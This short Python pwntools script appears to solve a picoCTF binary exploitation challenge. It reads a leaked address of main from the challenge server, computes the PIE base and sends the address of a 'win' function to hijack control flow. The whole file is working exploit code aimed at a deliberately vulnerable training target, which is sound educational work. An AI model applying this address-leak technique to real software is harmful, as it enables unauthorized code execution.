from pwn import *

pr = remote('rescued-float.picoctf.net', 57706)
# pr = process('./vuln')

elf = ELF('./vuln')



pr.recvuntil(b'main: ')

main_addr = int(pr.recvline().strip(),16)
log.info(f'main address: {hex(main_addr)}')

main_offset = elf.symbols['main']
base_offset = main_addr - main_offset

win_adders = base_offset + elf.symbols['win']
log.info(f'win address: {hex(win_adders)}')

log.info(f'base address: {hex(base_offset)}')


pr.sendlineafter(b': ' ,hex(win_adders))


print(pr.recvall().decode())
